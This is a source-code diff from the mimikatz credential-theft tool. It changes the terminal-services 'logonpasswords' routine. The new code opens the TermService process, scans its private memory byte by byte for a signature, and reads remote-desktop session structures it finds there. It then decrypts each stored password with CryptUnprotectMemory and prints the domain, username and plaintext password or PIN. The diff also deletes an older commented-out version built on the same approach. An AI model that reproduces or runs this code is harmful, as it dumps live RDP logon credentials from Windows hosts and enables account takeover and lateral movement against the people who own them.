@@ -174,12 +174,11 @@ NTSTATUS kuhl_m_ts_remote(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-const BYTE MyPattern[] = {0x00, 0x00, 0x00, 0x00, 0xbb, 0x47, 0x0b, 0x00};
 NTSTATUS kuhl_m_ts_logonpasswords(int argc, wchar_t * argv[])
 {
 	SERVICE_STATUS_PROCESS ServiceStatusProcess;
 	HANDLE hProcess;
-	STRUCT_DATASEARCH myDataSearch = {NULL, {(LPVOID) MyPattern, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}};
+	PKULL_M_MEMORY_HANDLE hMemory;
 
 	if(kull_m_service_getUniqueForName(L"TermService", &ServiceStatusProcess))
 	{
@@ -187,10 +186,12 @@ NTSTATUS kuhl_m_ts_logonpasswords(int argc, wchar_t * argv[])
 		{
 			if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, ServiceStatusProcess.dwProcessId))
 			{
-				if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &myDataSearch.hMemory))
+				if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hMemory))
 				{
-					kull_m_process_getMemoryInformations(myDataSearch.hMemory, kuhl_m_ts_logonpasswords_MemoryAnalysis, &myDataSearch);
-					kull_m_memory_close(myDataSearch.hMemory);
+					kprintf(L"!!! Warning, false positive can be listed !!!\n");
+
+					kull_m_process_getMemoryInformations(hMemory, kuhl_m_ts_logonpasswords_MemoryAnalysis, hMemory);
+					kull_m_memory_close(hMemory);
 				}
 			}
 			else PRINT_ERROR_AUTO(L"OpenProcess");
@@ -201,209 +202,61 @@ NTSTATUS kuhl_m_ts_logonpasswords(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
+const BYTE MyPattern[] = {0x00, 0x00, 0x00, 0x00, 0xbb, 0x47, /*0x0b, 0x00*/};
 BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
 {
-	PSTRUCT_DATASEARCH pMyDataSearch = (PSTRUCT_DATASEARCH) pvArg;
-	KULL_M_MEMORY_SEARCH sMemory;
-
-	if((pMemoryBasicInformation->Type == MEM_PRIVATE) && (pMemoryBasicInformation->State != MEM_FREE) && (pMemoryBasicInformation->Protect == PAGE_READWRITE))
-	{
-		sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory = pMyDataSearch->hMemory;
-		sMemory.kull_m_memoryRange.kull_m_memoryAdress.address = pMemoryBasicInformation->BaseAddress;
-		sMemory.kull_m_memoryRange.size = pMemoryBasicInformation->RegionSize;
-
-		if(kull_m_memory_search(&pMyDataSearch->aPattern, sizeof(MyPattern), &sMemory, TRUE)) // lucky only one by segment
-		{
-			kuhl_m_ts_logonpasswords_MemoryAnalysis_candidate(pMyDataSearch->hMemory, sMemory.result);
-		}
-	}
-	return TRUE;
-}
-
-void kuhl_m_ts_logonpasswords_MemoryAnalysis_candidate(PKULL_M_MEMORY_HANDLE hProcess, PVOID Addr)
-{
-	WTS_KIWI clientData;
-	KULL_M_MEMORY_ADDRESS aLocal = {&clientData, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {Addr, hProcess};
+	KULL_M_MEMORY_ADDRESS aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {pMemoryBasicInformation->BaseAddress, (PKULL_M_MEMORY_HANDLE) pvArg};
+	PBYTE CurrentPtr, limite;
+	PWTS_KIWI pKiwiData;
 	BOOL decStatus = TRUE;
 
-	if(aProcess.address)
-	{
-		if(kull_m_memory_copy(&aLocal, &aProcess, sizeof(WTS_KIWI)))
-		{
-			if(clientData.cbDomain < sizeof(clientData.Domain))
-			{
-				if(clientData.cbUsername < sizeof(clientData.UserName))
-				{
-					if(clientData.cbPassword < sizeof(clientData.Password))
-					{
-						kprintf(
-							L"\n   Domain     : %.*s\n"
-							L"   UserName   : %.*s\n",
-							clientData.cbDomain / sizeof(wchar_t), clientData.Domain,
-							clientData.cbUsername/ sizeof(wchar_t), clientData.UserName
-						);
-						
-						if(clientData.cbPassword && (MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10))
-						{
-							decStatus = kull_m_crypto_remote_CryptUnprotectMemory(hProcess, clientData.Password, sizeof(clientData.Password), CRYPTPROTECTMEMORY_SAME_PROCESS);
-						}
-
-						if(decStatus)
-						{
-							kprintf(L"   Password   : %.*s\n", clientData.cbPassword / sizeof(wchar_t), clientData.Password);
-						}
-					}
-				}
-			}
-		}
-	}
-}
-
-/*
-const char c_CRDPWDUMXStack[] = "CRDPWDUMXStack";
-NTSTATUS kuhl_m_ts_logonpasswords(int argc, wchar_t * argv[])
-{
-	SERVICE_STATUS_PROCESS ServiceStatusProcess;
-	HANDLE hProcess;
-	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModule;
-
-	KULL_M_MEMORY_ADDRESS aPattern = {(LPVOID) c_CRDPWDUMXStack, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
-	KULL_M_MEMORY_SEARCH sMemory = {{{NULL, NULL}, 0}, NULL};
-
-	STRUCT_MYSEARCH mySearch = {NULL, 0xdbcaabcd, 0x00000001};
-	STRUCT_DATASEARCH myDataSearch = {NULL, {&mySearch, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}};
-
-	if(kull_m_service_getUniqueForName(L"TermService", &ServiceStatusProcess))
-	{
-		if(ServiceStatusProcess.dwCurrentState >= SERVICE_RUNNING)
-		{
-			if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, ServiceStatusProcess.dwProcessId))
-			{
-				if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory))
-				{
-					if(kull_m_process_getVeryBasicModuleInformationsForName(sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory, (MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_BUILD_10_1809) ? L"rdpserverbase.dll" : L"rdpcorets.dll", &iModule))
-					{
-						kprintf(L"Module @ 0x%p (%u)\n", iModule.DllBase.address, iModule.SizeOfImage);
-						
-						sMemory.kull_m_memoryRange.kull_m_memoryAdress.address = iModule.DllBase.address;
-						sMemory.kull_m_memoryRange.size = iModule.SizeOfImage;
-						
-						if(kull_m_memory_search(&aPattern, sizeof(c_CRDPWDUMXStack), &sMemory, TRUE))
-						{
-							myDataSearch.hMemory = sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory;
-							mySearch.pCRDPWDUMXStack = (LPCSTR) sMemory.result;
-							kprintf(L"CRDPWDUMXStack @ 0x%p\n", mySearch.pCRDPWDUMXStack);
-							kull_m_process_getMemoryInformations(myDataSearch.hMemory, kuhl_m_ts_logonpasswords_MemoryAnalysis, &myDataSearch);
-						}
-					}
-					else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
-					kull_m_memory_close(myDataSearch.hMemory);
-				}
-			}
-			else PRINT_ERROR_AUTO(L"OpenProcess");
-		}
-		else PRINT_ERROR(L"Service is not running\n");
-	}
-	else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
-
-	return STATUS_SUCCESS;
-}
-
-BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
-{
-	PSTRUCT_DATASEARCH pMyDataSearch = (PSTRUCT_DATASEARCH) pvArg;
-	KULL_M_MEMORY_SEARCH sMemory;
-
 	if((pMemoryBasicInformation->Type == MEM_PRIVATE) && (pMemoryBasicInformation->State != MEM_FREE) && (pMemoryBasicInformation->Protect == PAGE_READWRITE))
 	{
-		sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory = pMyDataSearch->hMemory;
-		sMemory.kull_m_memoryRange.kull_m_memoryAdress.address = pMemoryBasicInformation->BaseAddress;
-		sMemory.kull_m_memoryRange.size = pMemoryBasicInformation->RegionSize;
-
-		if(kull_m_memory_search(&pMyDataSearch->aPattern, sizeof(STRUCT_MYSEARCH), &sMemory, TRUE))
+		aLocalBuffer.address = LocalAlloc(LPTR, pMemoryBasicInformation->RegionSize);
+		if(aLocalBuffer.address)
 		{
-			kuhl_m_ts_logonpasswords_MemoryAnalysis_candidate(pMyDataSearch->hMemory, (PBYTE) sMemory.result - FIELD_OFFSET(UNK_STRUCT0, pCRDPWDUMXStack));
+			if(kull_m_memory_copy(&aLocalBuffer, &aProcess, pMemoryBasicInformation->RegionSize))
+			{
+				for(CurrentPtr = (PBYTE) aLocalBuffer.address, limite = (PBYTE) aLocalBuffer.address + pMemoryBasicInformation->RegionSize; CurrentPtr + sizeof(MyPattern) <= limite; CurrentPtr++)
+				{
+					if(RtlEqualMemory(MyPattern, CurrentPtr, sizeof(MyPattern)))
+					{
+						pKiwiData = (PWTS_KIWI) CurrentPtr;
+						//kprintf(L"-> %08x (%hu %hu %hu)\n", pKiwiData->unk1, pKiwiData->cbDomain, pKiwiData->cbUsername, pKiwiData->cbPassword);
+						if((pKiwiData->unk1 & 0xff010000) == 0x00010000)
+						{
+							if(!(pKiwiData->cbDomain & 1) && (pKiwiData->cbDomain < sizeof(pKiwiData->Domain)))
+							{
+								if(!(pKiwiData->cbUsername & 1) && (pKiwiData->cbUsername < sizeof(pKiwiData->UserName)))
+								{
+									if(!(pKiwiData->cbPassword & 1) && (pKiwiData->cbPassword < sizeof(pKiwiData->Password)))
+									{
+										kprintf(
+											L"\n   Domain      : %.*s\n"
+											L"   UserName    : %.*s\n",
+											pKiwiData->cbDomain / sizeof(wchar_t), pKiwiData->Domain,
+											pKiwiData->cbUsername/ sizeof(wchar_t), pKiwiData->UserName
+											);
+
+										if(pKiwiData->cbPassword && (MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10))
+										{
+											decStatus = kull_m_crypto_remote_CryptUnprotectMemory(aProcess.hMemory, pKiwiData->Password, sizeof(pKiwiData->Password), CRYPTPROTECTMEMORY_SAME_PROCESS);
+										}
+
+										if(decStatus)
+										{
+											kprintf(L"   Password/Pin: %.*s\n", pKiwiData->cbPassword / sizeof(wchar_t), pKiwiData->Password);
+										}
+									}
+								}
+							}
+						}
+
+					}
+				}
+			}
+			LocalFree(aLocalBuffer.address);
 		}
 	}
 	return TRUE;
 }
-
-void kuhl_m_ts_logonpasswords_MemoryAnalysis_candidate(PKULL_M_MEMORY_HANDLE hProcess, PVOID Addr)
-{
-	UNK_STRUCT0 unkStruct0;
-	PVOID unk0;
-	WTS_KIWI clientData;
-	KULL_M_MEMORY_ADDRESS aLocal = {&unkStruct0, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {Addr, hProcess};
-
-	if(Addr)
-	{
-		kprintf(L"\n[ %p ]\n", Addr);
-		//kprintf(L"\nEntry\n=====\n");
-		if(kull_m_memory_copy(&aLocal, &aProcess, sizeof(UNK_STRUCT0)))
-		{
-			kprintf(L"  unkp0              : %p\n", unkStruct0.unkp0);
-			kprintf(L"  unkp1              : %p\n", unkStruct0.unkp1);
-
-			kprintf(L"  pCRDPWDUMXStack    : %p\n", unkStruct0.pCRDPWDUMXStack);
-			kprintf(L"  unk0               : 0x%08x\n", unkStruct0.unk0);
-			kprintf(L"  unk1               : 0x%08x\n", unkStruct0.unk1);
-
-			kprintf(L"  unkThis0           : %p\n", unkStruct0.unkThis0);
-			kprintf(L"  unk2               : 0x%08x\n", unkStruct0.unk2);
-
-			kprintf(L"  unkp2              : %p\n", unkStruct0.unkp2);
-			kprintf(L"  ImageBase          : %p\n", unkStruct0.ImageBase);
-			kprintf(L"  unkp3              : %p\n", unkStruct0.unkp3);
-			kprintf(L"  unkp4              : %p\n", unkStruct0.unkp4);
-			kprintf(L"  unkp5              : %p\n", unkStruct0.unkp5);
-
-			kprintf(L"  unk3               : 0x%08x\n", unkStruct0.unk3);
-			kprintf(L"  unk4               : 0x%08x\n", unkStruct0.unk4);
-			kprintf(L"  unk5               : 0x%08x\n", unkStruct0.unk5);
-			kprintf(L"  unk6               : 0x%08x\n", unkStruct0.unk6);
-			kprintf(L"  unk7               : 0x%08x\n", unkStruct0.unk7);
-
-			kprintf(L"  unkp6              : %p\n", unkStruct0.unkp6);
-			kprintf(L"  unkp7              : %p\n", unkStruct0.unkp7);
-			kprintf(L"  unkp8              : %p\n", unkStruct0.unkp8);
-			kprintf(L"  unkp9              : %p\n", unkStruct0.unkp9);
-			kprintf(L"  unkp10             : %p\n", unkStruct0.unkp10);
-			kprintf(L"  + 1160             : %p\n", (PBYTE) unkStruct0.unkp10 + 1160);
-			kprintf(L"  unkp11             : %p\n", unkStruct0.unkp11);
-			kprintf(L"  unkp12             : %p\n", unkStruct0.unkp12);
-
-			aLocal.address = &unk0;
-			aProcess.address = (PBYTE) unkStruct0.unkp10 + 1160; // 2019
-			//aProcess.address = (PBYTE) unkStruct0.unkp8 + 1160; // 2016
-
-
-			if(aProcess.address)
-			{
-				if(kull_m_memory_copy(&aLocal, &aProcess, sizeof(PVOID)))
-				{
-					aLocal.address = &clientData;
-					aProcess.address = unk0;
-
-					if(aProcess.address)
-					{
-						if(kull_m_memory_copy(&aLocal, &aProcess, sizeof(WTS_KIWI)))
-						{
-							kull_m_string_wprintf_hex(&clientData, 8, 1); kprintf(L"\n");
-
-							kprintf(L"   0          : 0x%08x\n", clientData.unk0);
-							kprintf(L"   Magic      : 0x%08x\n", clientData.unk1);
-							kprintf(L"   Domain     : %.*s\n", clientData.cbDomain / sizeof(wchar_t), clientData.Domain);
-							kprintf(L"   UserName   : %.*s\n", clientData.cbUsername/ sizeof(wchar_t), clientData.UserName);
-							// kprintf(L"   Password(e): "); kull_m_string_wprintf_hex(clientData.Password, sizeof(clientData.Password), 0); kprintf(L"\n");
-							if(kull_m_crypto_remote_CryptUnprotectMemory(hProcess, clientData.Password, sizeof(clientData.Password), CRYPTPROTECTMEMORY_SAME_PROCESS))
-							{
-								kprintf(L"   Password   : %.*s\n", clientData.cbPassword / sizeof(wchar_t), clientData.Password);
-							}
-						}
-					}
-				}
-			}
-		}
-	}
-}
-*/
